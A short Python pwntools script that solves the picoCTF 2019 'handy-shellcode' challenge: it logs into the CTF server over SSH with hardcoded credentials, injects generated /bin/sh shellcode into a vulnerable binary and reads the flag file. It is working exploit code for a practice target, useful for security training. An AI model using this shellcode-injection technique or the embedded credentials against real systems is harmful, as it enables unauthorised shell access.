from pwn import *
s=ssh(host="2019shell1.picoctf.com", user="cse331", password="3curityishard")
s.set_working_directory(wd=b"/problems/handy-shellcode_2_6ad1f834bdcf9fcfb41200ca8d0f55a6")
shellcode = asm(shellcraft.sh())
p = s.process("./vuln")
p.sendlineafter("Enter your shellcode:\n", shellcode)
p.sendlineafter("Thanks! Executing now...\n$ ", "cat flag.txt\n")
flag = p.recv(timeout=1).decode("utf-8") # https://stackoverflow.com/questions/606191/convert-bytes-to-a-string
flag = flag.split("{")[1].split("}")[0]
print(flag)
